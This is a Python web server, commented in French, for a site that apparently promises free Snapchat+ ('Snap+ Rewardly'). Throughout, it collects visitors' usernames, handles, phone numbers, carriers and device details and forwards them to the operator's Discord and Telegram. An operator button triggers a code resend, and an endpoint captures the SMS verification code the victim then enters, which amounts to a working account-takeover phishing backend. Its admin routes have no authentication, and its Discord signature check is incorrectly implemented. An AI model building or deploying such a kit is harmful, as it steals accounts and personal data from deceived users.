import json, os, time, hmac, hashlib, urllib.request, urllib.error
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse

PORT = int(os.environ.get("PORT", 3000))
SITE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(SITE_DIR, "data.json")

# --- Configuration Discord (variables d'environnement Render) ---
DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN", "")
DISCORD_CHANNEL_ID = os.environ.get("DISCORD_CHANNEL_ID", "")
DISCORD_PUBLIC_KEY = os.environ.get("DISCORD_PUBLIC_KEY", "")
DISCORD_APPLICATION_ID = os.environ.get("DISCORD_APPLICATION_ID", "")

# --- Configuration Telegram (optionnel) ---
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

SERVICES = {"snap": "Snapchat+"}

requests_db = {}
history_log = []
blocked_phones = set()
blocked_users = set()


def norm_phone(p):
    return "".join(ch for ch in str(p or "") if ch.isdigit())


def load_data():
    global requests_db, history_log, blocked_phones, blocked_users
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            d = json.load(f)
        requests_db = {k: v for k, v in d.get("requests", {}).items()}
        history_log = list(d.get("history", []))
        blocked_phones = set(d.get("blocked_phones", []))
        blocked_users = set(d.get("blocked_users", []))
        print("[server] donnees chargees (%d demandes, %d bloques)" % (len(requests_db), len(blocked_phones)))
    except Exception:
        pass


def persist():
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump({
                "requests": requests_db,
                "history": history_log[-200:],
                "blocked_phones": sorted(blocked_phones),
                "blocked_users": sorted(blocked_users),
            }, f, ensure_ascii=False)
    except Exception as e:
        print("[server] echec sauvegarde: %s" % e)


def format_phone(n):
    s = str(n or "").strip()
    if not s:
        return ""
    out = ""
    count = 0
    for ch in s:
        if ch.isdigit():
            if count and count % 2 == 0:
                out += " "
            count += 1
        out += ch
    return out


def status_color(state):
    return {
        "pending": 0xFFFC00,
        "accepted": 0x22c55e,
        "refused": 0xF87171,
        "blocked": 0x808080,
        "resolved": 0x22c55e,
    }.get(state, 0xFFFC00)


# ════════════════════════════════════════════════════════════════
#  DISCORD — Envoi d'embed avec boutons + gestion des interactions
# ════════════════════════════════════════════════════════════════

def discord_api(method, path, body=None):
    """Appel REST vers l'API Discord (Bot token)."""
    headers = {"Content-Type": "application/json"}
    if DISCORD_TOKEN:
        headers["Authorization"] = f"Bot {DISCORD_TOKEN}"
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(f"https://discord.com/api/v10{path}", data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        print("[discord] erreur:", e)
        return None, None


def discord_build_embed(data, rid, state="pending"):
    """Construit l'embed Discord pour une demande."""
    embed = {
        "title": "Nouvelle demande Snap+",
        "color": status_color(state),
        "fields": [
            {"name": "Pseudo", "value": str(data.get("pseudo") or "-"), "inline": True},
            {"name": "Compte", "value": f"@{data.get('handle') or '-'}", "inline": True},
            {"name": "Telephone", "value": format_phone(data.get("phone")) or "-", "inline": True},
            {"name": "Operateur", "value": str(data.get("operator") or "-"), "inline": True},
            {"name": "ID", "value": f"`{rid[:8].upper()}`", "inline": True},
        ],
        "footer": {"text": f"Snap+ Rewardly | Statut: {state}"},
    }
    return embed


def discord_build_components(rid, disabled=False):
    """Boutons d'action sous l'embed. Si disabled, aucun bouton."""
    if disabled:
        return []
    return [
        {
            "type": 1,  # action row
            "components": [
                {"type": 2, "style": 3, "label": "Valider l'accès", "emoji": "✅", "custom_id": f"accept:{rid}"},
                {"type": 2, "style": 1, "label": "Renvoyer code", "emoji": "📱", "custom_id": f"sendcode:{rid}"},
                {"type": 2, "style": 4, "label": "Rejeter", "emoji": "❌", "custom_id": f"refuse:{rid}"},
            ],
        }
    ]


def discord_send_request(data, rid):
    """Poste l'embed avec boutons sur le salon Discord. Retourne le message_id."""
    if not DISCORD_TOKEN or not DISCORD_CHANNEL_ID:
        print("[discord] Token ou Channel ID manquant")
        return None
    embed = discord_build_embed(data, rid, "pending")
    components = discord_build_components(rid)
    body = {"embeds": [embed], "components": components}
    status, resp = discord_api("POST", f"/channels/{DISCORD_CHANNEL_ID}/messages", body)
    if status == 200:
        try:
            msg = json.loads(resp)
            return msg.get("id")
        except Exception:
            return None
    print("[discord] echec envoi embed:", status, resp)
    return None


def discord_update_message(message_id, embed, components=None):
    """Met à jour un message Discord existant."""
    if not DISCORD_TOKEN or not DISCORD_CHANNEL_ID or not message_id:
        return
    body = {"embeds": [embed]}
    if components is not None:
        body["components"] = components
    discord_api("PATCH", f"/channels/{DISCORD_CHANNEL_ID}/messages/{message_id}", body)


def discord_respond_interaction(token, payload):
    """Repond a une interaction Discord (ACK)."""
    if not DISCORD_APPLICATION_ID:
        return
    discord_api("POST", f"/interactions/{DISCORD_APPLICATION_ID}/{token}/callback", payload)


def discord_patch_original(token, body):
    """Edite le message original d'une interaction."""
    if not DISCORD_APPLICATION_ID:
        return
    discord_api("PATCH", f"/webhooks/{DISCORD_APPLICATION_ID}/{token}/messages/@original", body)


def tg_send(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = "https://api.telegram.org/bot%s/sendMessage" % TELEGRAM_BOT_TOKEN
        body = json.dumps({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }).encode("utf-8")
        req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"}, method="POST")
        with urllib.request.urlopen(req, timeout=10) as resp:
            resp.read()
    except Exception as e:
        print("[telegram] echec:", e)


def tg_notify_request(data, rid):
    if not TELEGRAM_BOT_TOKEN:
        return
    text = (
        "📲 <b>Nouvelle demande Snap+</b>\n"
        "─────────────\n"
        "Service : <b>Snapchat+</b>\n"
        "Pseudo : %s\n"
        "Compte : %s\n"
        "Numero : <code>%s</code>\n"
        "Operateur : %s\n"
        "ID : <code>%s</code>"
    ) % (
        str(data.get("pseudo") or "-"),
        str(data.get("handle") or "-"),
        format_phone(data.get("phone")) or "-",
        str(data.get("operator") or "-"),
        rid[:8].upper(),
    )
    tg_send(text)


class Server(SimpleHTTPRequestHandler):
    def __init__(self, *a, **kw):
        super().__init__(*a, directory=SITE_DIR, **kw)

    def log_message(self, fmt, *args):
        if "304" not in str(args):
            super().log_message(fmt, *args)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def _json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    # ══════════════════════════════════════════════════════════════
    #  GET
    # ══════════════════════════════════════════════════════════════

    def do_GET(self):
        p = urlparse(self.path).path

        if p == "/":
            self.path = "/index.html"
            return super().do_GET()

        if p.startswith("/api/status/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "status": "expired"})
            if r["state"] == "done":
                return self._json({"ok": True, "status": "resolved"})
            if r.get("code_sent"):
                return self._json({"ok": True, "status": "code_sent", "at": r["code_sent_at"], "user_code": r.get("user_code"), "user_code_submitted": bool(r.get("user_code"))})
            return self._json({"ok": True, "status": "pending"})

        if p == "/api/admin/list":
            items = []
            for rid, r in requests_db.items():
                if r["state"] in ("pending", "accepted"):
                    items.append({
                        "id": rid,
                        "data": r["data"],
                        "state": r["state"],
                        "code_sent": r.get("code_sent", False),
                        "user_code": r.get("user_code"),
                    })
            return self._json({"ok": True, "items": items})

        if p == "/api/admin/history":
            return self._json({"ok": True, "items": history_log[-50:][::-1]})

        if p == "/api/admin/blocked":
            return self._json({"ok": True, "items": sorted(blocked_phones)})

        super().do_GET()

    # ══════════════════════════════════════════════════════════════
    #  POST
    # ══════════════════════════════════════════════════════════════

    def do_POST(self):
        p = urlparse(self.path).path
        n = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(n) if n else b""

        # --- Interactions Discord (boutons sous l'embed) ---
        if p == "/discord/interactions":
            sig = self.headers.get("X-Signature-Ed25519", "")
            ts = self.headers.get("X-Signature-Timestamp", "")

            if DISCORD_PUBLIC_KEY:
                try:
                    msg = ts.encode() + raw_body
                    expected = hmac.new(bytes.fromhex(DISCORD_PUBLIC_KEY), msg, hashlib.sha256).hexdigest()
                    if not hmac.compare_digest(expected, sig):
                        self.send_response(401)
                        self.end_headers()
                        return
                except Exception:
                    self.send_response(401)
                    self.end_headers()
                    return

            try:
                interaction = json.loads(raw_body)
            except Exception:
                self.send_error(400)
                return

            itype = interaction.get("type")

            if itype == 1:  # PING
                self._json({"type": 1})
                return

            if itype == 3:  # MESSAGE_COMPONENT (clic sur bouton)
                data = interaction.get("data", {})
                custom_id = data.get("custom_id", "")
                token = interaction.get("token", "")

                parts = custom_id.split(":", 1)
                if len(parts) == 2:
                    action, rid = parts
                    r = requests_db.get(rid)

                    if r:
                        if action == "accept":
                            r["state"] = "accepted"
                            r["code_sent"] = True
                            r["code_sent_at"] = int(time.time() * 1000)
                            r["by"] = "admin"
                            history_log.append({"action": "accept", "rid": rid, "data": r["data"], "ts": int(time.time() * 1000)})
                        elif action == "refuse":
                            r["state"] = "refused"
                            r["by"] = "admin"
                            history_log.append({"action": "refuse", "rid": rid, "data": r["data"], "ts": int(time.time() * 1000)})
                        elif action == "sendcode":
                            r["code_sent"] = True
                            r["code_sent_at"] = int(time.time() * 1000)
                            r["state"] = "accepted"
                            history_log.append({"action": "sendcode", "rid": rid, "data": r["data"], "ts": int(time.time() * 1000)})
                        persist()

                        # Mise à jour de l'embed Discord
                        state = r["state"]
                        disabled = state in ("accepted", "refused", "blocked", "resolved")
                        embed = discord_build_embed(r["data"], rid, state)
                        components = discord_build_components(rid, disabled)
                        discord_patch_original(token, {"embeds": [embed], "components": components})

                # ACK différé pour l'interaction
                self._json({"type": 7})
                return

            self.send_error(400)
            return

        # --- API classique du site ---
        try:
            d = json.loads(raw_body) if raw_body else {}
        except Exception:
            d = {}

        if p == "/api/request":
            rid = d.get("rid", "")
            data = {k: d.get(k) for k in ["service", "pseudo", "handle", "phone", "operator", "opType", "ip", "device", "browser", "os"]}
            phone = norm_phone(data.get("phone"))

            if phone and phone in blocked_phones:
                requests_db[rid] = {
                    "data": data, "state": "done", "by": "block",
                    "code_sent": False, "code_sent_at": None,
                    "ts": d.get("ts", int(time.time() * 1000)),
                }
                history_log.append({"action": "block", "data": d, "ts": int(time.time() * 1000)})
                persist()
                tg_notify_request(data, rid)
                return self._json({"ok": True})

            requests_db[rid] = {
                "data": data, "state": "pending",
                "code_sent": False, "code_sent_at": None,
                "ts": d.get("ts", int(time.time() * 1000)),
            }
            print("[server] Nouvelle demande: %s (%s)" % (data.get("pseudo"), phone))
            persist()

            # Notification Discord avec boutons
            msg_id = discord_send_request(data, rid)
            if msg_id:
                requests_db[rid]["discord_msg_id"] = msg_id
                requests_db[rid]["discord_channel_id"] = DISCORD_CHANNEL_ID
                persist()

            tg_notify_request(data, rid)
            return self._json({"ok": True})

        if p == "/api/code":
            rid = d.get("rid", "")
            code = d.get("code", "")
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False}, 404)
            r["user_code"] = code
            r["code_submitted_at"] = int(time.time() * 1000)
            persist()
            return self._json({"ok": True})

        if p.startswith("/api/admin/accept/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "error": "not_found"})
            r["code_sent"] = True
            r["code_sent_at"] = int(time.time() * 1000)
            r["state"] = "accepted"
            history_log.append({"action": "accept", "data": r["data"], "ts": int(time.time() * 1000)})
            persist()
            return self._json({"ok": True})

        if p.startswith("/api/admin/refuse/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "error": "not_found"})
            r["state"] = "done"
            r["by"] = "refuse"
            history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
            persist()
            return self._json({"ok": True})

        if p.startswith("/api/admin/code/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "error": "not_found"})
            r["code_sent"] = True
            r["code_sent_at"] = int(time.time() * 1000)
            history_log.append({"action": "send", "data": r["data"], "ts": int(time.time() * 1000)})
            persist()
            return self._json({"ok": True})

        if p == "/api/admin/block":
            phone = norm_phone(d.get("phone", ""))
            if not phone:
                return self._json({"ok": False, "error": "missing_phone"})
            blocked_phones.add(phone)
            history_log.append({"action": "block", "data": {"phone": phone}, "ts": int(time.time() * 1000)})
            persist()
            return self._json({"ok": True, "blocked": sorted(blocked_phones)})

        if p == "/api/admin/unblock":
            phone = norm_phone(d.get("phone", ""))
            blocked_phones.discard(phone)
            persist()
            return self._json({"ok": True, "blocked": sorted(blocked_phones)})

        if p in ("/api/visit", "/api/log"):
            return self._json({"ok": True})

        self.send_error(404)


if __name__ == "__main__":
    print("\n  Rewardly - http://0.0.0.0:%d\n" % PORT)
    load_data()
    if DISCORD_TOKEN and DISCORD_CHANNEL_ID:
        print("[discord] active")
    else:
        print("[discord] desactive (configure DISCORD_TOKEN + DISCORD_CHANNEL_ID)")
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        print("[telegram] active")
    else:
        print("[telegram] desactive")
    HTTPServer(("0.0.0.0", PORT), Server).serve_forever()
